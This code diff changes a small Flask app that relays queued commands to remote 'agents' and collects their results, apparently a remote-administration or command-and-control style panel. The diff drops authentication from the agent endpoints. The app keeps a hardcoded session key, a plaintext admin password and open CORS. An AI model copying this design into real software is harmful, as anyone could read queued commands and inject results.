@@ -2,17 +2,14 @@ from flask import Flask, request, jsonify, render_template, redirect, url_for, s
 from flask_cors import CORS
 from flask_session import Session
 import threading
-import time
 
 app = Flask(__name__, template_folder="templates")
 CORS(app)
 
-
 app.secret_key = 'very_secret_key_123'
-
-
 app.config['SESSION_TYPE'] = 'filesystem'
 Session(app)
+
 users = {
     'marusiak': 'admin123'
 }
@@ -20,7 +17,6 @@ users = {
 commands = {}
 results = {}
 
-# Декоратор для захисту сторінок
 def login_required(f):
     from functools import wraps
     @wraps(f)
@@ -30,12 +26,10 @@ def login_required(f):
         return f(*args, **kwargs)
     return decorated
 
-
 @app.route('/')
 @login_required
 def index():
     return render_template("connection.html", username=session['username'])
-
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -49,12 +43,10 @@ def login():
             return render_template('login.html', error='Невірний логін або пароль')
     return render_template('login.html')
 
-
 @app.route('/logout')
 def logout():
     session.pop('username', None)
     return redirect(url_for('login'))
-
 
 @app.route('/set_command/<server_id>', methods=['POST'])
 @login_required
@@ -63,23 +55,21 @@ def set_command(server_id):
     commands[server_id] = payload
     return jsonify({"status": "command_set"})
 
-@app.route('/get_command/<server_id>', methods=['GET'])
-@login_required
-def get_command(server_id):
-    cmd = commands.pop(server_id, None)
-    return jsonify(cmd if cmd else {"status": "no_command"})
-
-@app.route('/post_result/<server_id>', methods=['POST'])
-@login_required
-def post_result(server_id):
-    results[server_id] = request.json
-    return jsonify({"status": "result_received"})
-
 @app.route('/get_result/<server_id>', methods=['GET'])
 @login_required
 def get_result(server_id):
     res = results.pop(server_id, None)
     return jsonify(res if res else {"status": "no_result"})
+
+@app.route('/agent_get_command/<server_id>', methods=['GET'])
+def agent_get_command(server_id):
+    cmd = commands.pop(server_id, None)
+    return jsonify(cmd if cmd else {"status": "no_command"})
+
+@app.route('/agent_post_result/<server_id>', methods=['POST'])
+def agent_post_result(server_id):
+    results[server_id] = request.json
+    return jsonify({"status": "result_received"})
 
 @app.route('/health', methods=['GET'])
 def health():
